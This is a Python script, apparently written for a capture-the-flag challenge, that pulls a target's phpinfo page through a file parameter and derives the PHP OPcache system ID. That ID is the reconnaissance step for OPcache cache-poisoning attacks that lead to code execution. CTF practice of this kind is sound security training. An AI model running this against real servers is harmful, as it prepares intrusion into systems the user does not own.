import sys
import re
import requests
import hashlib
from packaging import version  # pip install packaging

url = 'http://core.hello-ctf.com:32882/'
phpinfo_url = url + '/?file=phpinfo'

text = requests.get(phpinfo_url).text
print(text)
php_version = re.search(r'<tr><td class="e">PHP Version </td><td class="v">(.*) </td></tr>', text)
if php_version is None:
    php_version = re.search(r'<h1 class="p">PHP Version (.*)', text)
if php_version is None:
    print("No PHP version found, is this a phpinfo file?")
    sys.exit(0)
php_version = php_version.group(1)
php_greater_74 = (version.parse("7.4.0") < version.parse(php_version.split("-")[0]))
zend_extension_id = re.search(r'<tr><td class="e">Zend Extension Build </td><td class="v">(.*) </td></tr>', text)
if zend_extension_id is None:
    print("No Zend Extension Build found.")
    sys.exit(0)
zend_extension_id = zend_extension_id.group(1)
architecture = re.search(r'<tr><td class="e">System </td><td class="v">(.*) </td></tr>', text)
if architecture is None:
    print("No System info found.")
    sys.exit(0)
architecture = architecture.group(1).split()[-1]
if architecture == "x86_64":
    bin_id_suffix = "48888"
else:
    bin_id_suffix = "44444"
if php_greater_74:
    zend_bin_id = "BIN_" + bin_id_suffix
else:
    zend_bin_id = "BIN_SIZEOF_CHAR" + bin_id_suffix
if not php_greater_74:
    if architecture == "x86_64":
        alt_bin_id_suffix = "148888"
    else:
        alt_bin_id_suffix = "144444"

    alt_zend_bin_id = "BIN_" + alt_bin_id_suffix
print("PHP version : " + php_version)
print("Zend Extension ID : " + zend_extension_id)
print("Zend Bin ID : " + zend_bin_id)
print("Assuming " + architecture + " architecture")
digest = hashlib.md5((php_version + zend_extension_id + zend_bin_id).encode()).hexdigest()
print("------------")
print("System ID : " + digest)
if not php_greater_74:
    alt_digest = hashlib.md5((php_version + zend_extension_id + alt_zend_bin_id).encode()).hexdigest()
    print("PHP lower than 7.4 detected, an alternate Bin ID is possible:")
    print("Alternate Zend Bin ID : " + alt_zend_bin_id)
    print("Alternate System ID : " + alt_digest)
print("------------")
